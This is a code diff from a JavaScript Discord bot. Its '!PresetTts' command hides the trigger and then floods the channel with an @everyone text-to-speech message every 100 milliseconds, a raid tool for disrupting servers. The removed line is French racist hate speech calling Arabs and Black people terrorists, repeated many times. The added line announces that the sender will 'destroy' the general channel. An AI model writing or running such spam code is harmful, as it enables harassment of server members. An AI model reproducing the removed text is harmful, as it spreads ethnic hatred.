@@ -420,7 +420,7 @@ msg.reply(`Salut !`)
   if (msg.content === '!PresetTts' ) {
     if (msg.deletable) msg.delete();
     let inteval = setInterval(function() {
-      msg.channel.send('@everyone ' + 'nique les arabes et les noirs car ce sont des terroristes nique les arabes et les noirs car ce sont des terroristes nique les arabes et les noirs car ce sont des terroristes nique les arabes et les noirs car ce sont des terroristes nique les arabes et les noirs car ce sont des terroristes nique les arabes et les noirs car ce sont des terroristes nique les arabes et les noirs car ce sont des terroristes nique les arabes et les noirs car ce sont des terroristes nique les arabes et les noirs car ce sont des terroristes', {tts: true} ); 
+      msg.channel.send('@everyone ' + 'COUCOU JE ME NOMME EAUCALME ET JE VOUS DÉTRUIRE VOTRE GÉNÉRAL :heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart::heart:', {tts: true} ); 
     }, 100);    
     commandIntervals.push(inteval);
   }
